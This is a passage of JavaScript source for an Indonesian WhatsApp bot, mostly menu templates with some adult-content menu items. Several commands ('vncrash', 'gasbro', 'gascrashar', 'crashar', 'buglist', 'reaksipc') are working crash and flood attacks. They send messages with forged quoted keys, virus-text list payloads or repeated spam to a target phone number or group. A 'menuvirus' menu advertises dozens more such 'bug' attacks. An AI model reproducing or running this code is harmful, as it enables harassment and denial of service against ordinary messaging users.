rikibos.send5ButImg(m.chat, anu, rikibos.user.name, global.thumb, btn)
} else if (setbot.templateGif) {
rikibos.send5ButGif(m.chat, anu, rikibos.user.name, global.ggikal, btn)
} else if (setbot.templateVideo) {
rikibos.send5ButVid(m.chat, anu, rikibos.user.name, global.visoka, btn)
} else if (setbot.templateDocument) {
                        let buttonmenu = [
        	{ urlButton: { displayText: `YouTube 🍒`, url : `${youtube}` } },
            { urlButton: { displayText: `Script 🍜`, url: `${myweb}` } },
            { quickReplyButton: { displayText: `All Menu 🍱`, id: 'allmenu'} },
            { quickReplyButton: { displayText: `Bug Menu 🍢`, id: 'bugmenu'} },
            { quickReplyButton: { displayText: `Owner 🤣`, id: 'owner'} }
        	]
        	rikibos.sendMessage(m.chat, { caption: anu, document: fs.readFileSync('./rikilah/lib/cheems.xlsx'), mimetype: `${docs}`, fileName: `${ownername}`, templateButtons: buttonmenu, footer: `${botname}`, mentionedJid: [m.sender] })
                        }
                     }
            break
//=================================================//
case 'bot': {
if (!isCreator) return
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./rikilah/image/rikgans.jpg') }, { upload: rikibos.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": ` © Hai kak ${pushname} Selamat ${salam} 

Apa yang bisa saya bantu?
Silahkan Klick Menu Untuk Melanjutkan`,
"description": ` - © 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 -

╭━═════════════━•
◎ Owner : 『 ${botname} 』
◎ Lib : 『 Multi-Device 』
◎ Terbit : 『 *29-07-2022* 』
╰━═════════════━•

『 🇮🇩 RIK BOT 』`,

"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 WE ARE NOT MASTOD`,
"url": "www.instagram.com/ryarllh_01/"
},
"businessOwnerJid": "6287741097274@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: rik })
rikibos.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'menubot': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU SUARA BOT* 

╭━═════════════━• 
│『 𝐌𝐄𝐍𝐔 𝐒𝐎𝐔𝐍𝐃 』
╰━═════════════━•
╭━═════════════━•
│➳assalamualaikum
│➳rik
│➳apaa
│➳ngakak
│➳anjay
│➳anjing
│➳apa
│➳bohong
│➳porno
│➳tes
│➳caper
│➳diam
│➳gajelas
│➳insaf
│➳jagoan
│➳kenapa
│➳kuntilanak
│➳lonte
│➳siapa
│➳nangis
│➳ngeri
│➳otaknya
│➳gapeduli
│➳save
│➳seleb
│➳sinidek
│➳sokap
│➳soker
│➳tapi
│➳tetew
│➳tidak
│➳kocok
│➳gatau
│➳cakep
│➳minggir
│➳asik
│➳ketawa
│➳awkwk
│➳bang
│➳nob
│➳musik
│➳mastah
│➳slebew
│➳cantik
│➳kesel
│➳sakit
│➳ahh
│➳ohh
│➳ngeselin
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 300, 300)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'menubahagia': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU BAHAGIA* 

╭━═════════════━•
│『 *MENU BAHAGIA* 』
╰━═════════════━•
╭━═════════════━•
│➳bagaimanakah
│➳kapankah
│➳apakah
│➳bisakah
│➳rate
│➳wangy
│➳gantengcek
│➳cekganteng
│➳cantikcek
│➳cekcantik
│➳sangecek
│➳ceksange
│➳gaycek
│➳cekgay
│➳lesbicek
│➳halah
│➳hilih
│➳huluh
│➳heleh
│➳holoh
│➳jadian
│➳jodohku
│➳delttt
│➳tictactoe
│➳family100
│➳tebak [option]
│➳math [mode]
│➳suitpvp [@tag]
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'bugfc':
if (isBan) return reply(mess.ban)
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
ydd = `RIK OHHz`
rikibos.sendMessage(from, {text:ydd},{quoted: { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc Bang`, 
"jpegThumbnail": ppnyauser
}
}
}})
break
case 'vncrash':
if (!isPrem) return replyPremium(mess.premium)
if (!text) throw `MANA NOMERNYA BANG`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `HAYOOO RIK OOHZ`, 
                "jpegThumbnail": log0
            } 
        } 
    }
 hey = fs.readFileSync('Musik/sound/chan.mp3')
rikibos.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
case 'gasbro':
                if (!isPrem) return replyPremium(mess.premium)
                if (!text) throw `MANA NOMERNYA BANG`
                gasbugpc = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
                rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:gasbugpc})
                m.reply(`succes`)

                break
case 'crashar':               
if (!isPrem) return replyPremium(mess.premium)
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await rikibos.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await rikibos.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await rikibos.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            break
case 'gascrashar':               
if (!isPrem) return replyPremium(mess.premium)
          if (!text) throw `MANA NOMERNYA BANG`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            m.reply(`SUCCES`)
            break
case 'colidek' : {
if (!isPrem) return replyPremium(mess.premium)
                    a = await rikibos.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await rikibos.sendMessage(m.chat, {text:"𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await rikibos.sendMessage(m.chat, {text:"𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    await rikibos.sendMessage(m.chat, {text:"𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
                    m.reply(`BUG BIASA BANG`)
                     }
break
case 'buglist':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
listdek = [
                {
                title: `༒✪͜͡★➤RIK OHH፝͜͡✪༒ ${ngazap} ${virtex10}`,
                rows: [
                {title: buttonvirus, rowId: `haloooo'`, description: `RIK OHHz`},
                {title: buttonvirus, rowId: `tidurbang`, description: `Halo pak suhu`}
                ]
                }
                ]
                rikibos.sendListMsg(m.chat, `༒✪͜͡★➤⃨⃞⃟RIK OHHz➤⃨⃞⃟★፝͜͡✪༒`, rikibos.user.name, `Haiii bang`, `༒✪͜͡★➤⃨⃞⃟RIK OHHz➤⃨⃞⃟★፝͜͡✪༒`, listdek, m)
                }
                }
break
case 'reaksipc' : {
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await rikibos.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
}
break
case 'reaksigc' : {
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await rikibos.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
rikibos.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
case 'menuvirus': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` © Hii Kak ${pushname} Selamat ${salam}

─│➳ Fitur Bug Menu
Silahkan Klick Menu Untuk Melanjutkan


 - © 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 -
╭━═════════════━•
◎ Owner : 『 ${botname} 』
◎ Lib : 『 Multi-Device 』
◎ Terbit : 『 *29-07-2022* 』
╰━═════════════━• 
╭━═════════════━• 
│ 〘 𝐀𝐋𝐋 𝐕𝐈𝐑𝐔𝐒 〙
╰━═════════════━• 
╭━═════════════━•
│〘 ALL VIRUS GRUP 〙
╰━═════════════━• 
╭━═════════════━•
│➳${prefix}bugfc (khusus grup)
│➳${prefix}inibug (khusus grup)
│➳${prefix}buggoib (khusus grup)
│➳${prefix}cataloggc (khusus grup)
│➳${prefix}bugtag (khusus grup)
│➳${prefix}reaksigc (khusus grup)
│➳${prefix}buggc (khusus grup)
╰━═════════════━• 
╭━═════════════━•
│〘 ALL VIRUS TARGET 〙
╰━═════════════━•
╭━═════════════━•
│➳${prefix}momoto (target)
│➳${prefix}gasmomo (target)
│➳${prefix}helloto (target)
│➳${prefix}gashello (target)
│➳${prefix}tengkorato (target)
│➳${prefix}gastengkorak (target)
│➳${prefix}catalogpc (target)
│➳${prefix}ampas1 (target)
│➳${prefix}ampas2 (target)
│➳${prefix}sendbugcatalogpc (target)
│➳${prefix}bugpc2 (target)
│➳${prefix}gasbro (target)
│➳${prefix}virtext (target)
│➳${prefix}bugpc (target)
│➳${prefix}gascrashar (target)
│➳${prefix}vncrash (target) 
╰━═════════════━• 
╭━═════════════━•
│〘 ALL VIRUS CHAT GRUP 〙
╰━═════════════━• 
╭━═════════════━•
│➳${prefix}sendbug (chat/grup)
│➳${prefix}buglist (chat/grup)
│➳${prefix}reaksipc (chat/grup)
│➳${prefix}momo (chat/grup)
│➳${prefix}hello (chat/grup)
│➳${prefix}tengkorak (chat/grup)
│➳${prefix}mukajelek (chat/grup)
│➳${prefix}korakgans (chat/grup)
│➳${prefix}gantengbos (chat/grup)
│➳${prefix}cemenbos (chat/grup)
│➳${prefix}rikbos (chat/grup)
│➳${prefix}tutordek (chat/grup)
│➳${prefix}serembos (chat/grup)
│➳${prefix}helidek (chat/grup)
│➳${prefix}welcomebos (chat/grup)
│➳${prefix}troli (chat/grup)
│➳${prefix}troli2 (chat/grup)
│➳${prefix}bug1 (chat/grup)
│➳${prefix}bug2 (chat/grup)
│➳${prefix}bug3 (chat/grup)
│➳${prefix}bug4 (chat/grup)
│➳${prefix}bug5 (chat/grup)
│➳${prefix}bug6 (chat/grup)
│➳${prefix}bug7 (chat/grup)
│➳${prefix}buglokasi (chat/grup)
│➳${prefix}livelokasi (chat/grup)
│➳${prefix}buginvite (chat/grup)
│➳${prefix}catalog (chat/grup)
│➳${prefix}bugstik (chat/grup)
│➳${prefix}gasdek (chat/grup)
│➳${prefix}bugie (chat/grup)
│➳${prefix}bugbcimage (chat/grup)
│➳${prefix}bugbcvideo (chat/grup)
│➳${prefix}bugbcaudio (chat/grup)
│➳${prefix}bugbctext (chat/grup)
│➳${prefix}buttonampas (chat/grup)
│➳${prefix}bugtod (chat/grup)
│➳${prefix}bugbokep (chat/grup)
│➳${prefix}hiya (chat/grup)
│➳${prefix}bugrik (chat/grup)
│➳${prefix}bugsange (chat/grup)
│➳${prefix}bugcrot (chat/grup)
│➳${prefix}bughaha (chat/grup)
│➳${prefix}bugahh (chat/grup)
│➳${prefix}bugohh (chat/grup)
│➳${prefix}bugngakak (chat/grup)
│➳${prefix}bugwkwk (chat/grup)
│➳${prefix}bugmusik (chat/grup)
│➳${prefix}bugbang (chat/grup)
│➳${prefix}bugnob (chat/grup)
│➳${prefix}bugbot (chat/grup)
│➳${prefix}bugsuhu (chat/grup)
│➳${prefix}bugca (chat/grup)
│➳${prefix}bugwibu (chat/grup)
│➳${prefix}bugkesel (chat/grup)
│➳${prefix}bugngeselin (chat/grup)
│➳${prefix}bugsakit (chat/grup)
│➳${prefix}colidek (chat/grup)
│➳${prefix}crashar (chat/grup)
╰━═════════════━•

╭━═════════════━•
│➳Masih belum paham?
│➳chat/grup = kirim dimana aja
│➳nomor target = 628xxxxxx
│➳khusus grup = cuman bisa digrup
│➳nominal = mau berapa dikirimnya
│➳detik = 10s/5s/20s
╰━═════════════━`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'menuprimbon': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU PRIMBON* 

╭━═════════════━•
│『 *MENU PRIMBON* 』
╰━═════════════━•
╭━═════════════━•
│➳nomorhoki
│➳artimimpi
│➳artinama
│➳ramaljodoh
│➳ramaljodohbali
│➳suamiistri
│➳ramalcinta
│➳cocoknama
│➳pasangan
│➳jadiannikah
│➳sifatusaha
│➳rezeki
│➳pekerjaan
│➳nasib
│➳penyakit
│➳tarot
│➳fengshui
│➳haribaik
│➳harisangar
│➳harisial
│➳nagahari
│➳arahrezeki
│➳peruntungan
│➳weton
│➳karakter
│➳keberuntungan
│➳memancing
│➳masasubur
│➳zodiak
│➳shio
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'islamiyah': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU ISLAM*

╭━═════════════━• 
│ *MENU ISLAM*
╰━═════════════━•
╭━═════════════━•
│➳iqra
│➳hadist
│➳alquran
│➳juzamma
│➳tafsirsurah
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'menudesah': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU DESAH*

╭━═════════════━• 
│ *MENU DESAH*
╰━═════════════━•
╭━═════════════━•
│➳desah
│➳desah2
│➳desah3
│➳desah4
│➳desah5
│➳desah6
│➳desah7
│➳desah8
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'beritaterbaru': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *BERITA TERBARU* 

╭━═════════════━•
│『 *BERITA TERBARU* 』
╰━═════════════━•
╭━═════════════━•
│➳merdeka-news
│➳kontan-news 
│➳cnbc-news
│➳tribun-news
│➳indozone-news
│➳kompas-news
│➳detik-news
│➳daily-news
│➳inews-news
│➳okezone-news
│➳sindo-news
│➳tempo-news
│➳antara-news
│➳cnn-news
│➳fajar-news
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break

//=================================================//
case 'menugrup': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU GRUP* 

╭━═════════════━•
│『 *MENU GRUP* 』
╰━═════════════━•
╭━═════════════━•
│🜙linkgroup
│🜙ephemeral [option]
│🜙setppgc [image]
│🜙setname [text]
│🜙setdesc [text]
│🜙group [option]
│🜙editinfo [option]
│🜙add @user
│🜙kick @user
│🜙ban [targer]
│🜙hidetag [text]
│🜙tagall [text]
│🜙promote @user
│🜙demote @user
│🜙vote [text]
│🜙spam [ jumlah ]
│🜙devote
│🜙inspect
│🜙getname
│🜙translate
│🜙kalkulator
│🜙intro
│🜙getpic
│🜙penjara
│🜙intro
│🜙upvote
│🜙cekvote
│🜙hapusvote
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'pengubahsuara': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *PENGUBAH SUARA* 

╭━═════════════━•
│『 *PENGUBAH SUARA* 』
╰━═════════════━•
╭━═════════════━•
│➳bass
│➳blown
│➳deep
│➳earrape
│➳fast
│➳fat
│➳nightcore
│➳reverse
│➳robot
│➳slow
│➳tupai
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'asupanmata': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *Asupan Mata*

╭━═════════════━•
│『 *ASUPAN* 』 
╰━═════════════━•
╭━═════════════━•
│➳asupan
│➳asupanukhty
│➳asupansantuy
│➳cecan-malaysia
│➳cecan-indo
│➳hijaber
│➳cecan-korea
│➳cecan-vietnam
│➳cecan-thai
│➳cecan-jepan
│➳cecan
│➳bokep
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'menucari': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU CARI* 

╭━═════════════━•
│『 *MENU CARI* 』
╰━═════════════━•
╭━═════════════━•
│➳play [query]
│➳yts [query]
│➳google [query]
│➳gimage [query]
│➳pinterest [query]
│➳wallpaper [query]
│➳wikimedia [query]
│➳ytsearch [query]
│➳ringtone [query]
│➳searchgroups [query]
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'menukeren': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
sxs = `⭔ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
anu = ` *MENU KEREN* 

┌──『 *KONVERSI MEMO* 』
│➳⊱nulis
│➳⊱attp
│➳⊱ttp
│➳⊱toimage
│➳⊱sticker
│➳⊱emoji
│➳⊱emojimix
│➳⊱emojimix2
│➳⊱tovideo
│➳⊱togif
│➳⊱tourl
│➳⊱tovn
│➳⊱toonce
│➳⊱tomp3
│➳⊱toaudio
│➳⊱ebinary
│➳⊱dbinary
│➳⊱styletext
│➳⊱smeme
│➳⊱ss [url]
╰━═════════════━•`
let gambar = await getBuffer(global.menuimg)
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
 hydratedTemplate: {
hydratedContentText: anu,
locationMessage: { 
jpegThumbnail: await reSize(gambar, 200, 200)},
hydratedFooterText: sxs,
hydratedButtons: [
{ urlButton: { displayText: 'Sosmed', url: 'https://www.instagram.com/ryarllh_01/' } },
{ quickReplyButton: { displayText: 'Owner', id: `${prefix}owner` } }, 
{ quickReplyButton: { displayText: 'All Menu', id: `${prefix}allmenu` } },
 ] 
}
 }
}), { userJid: m.chat })
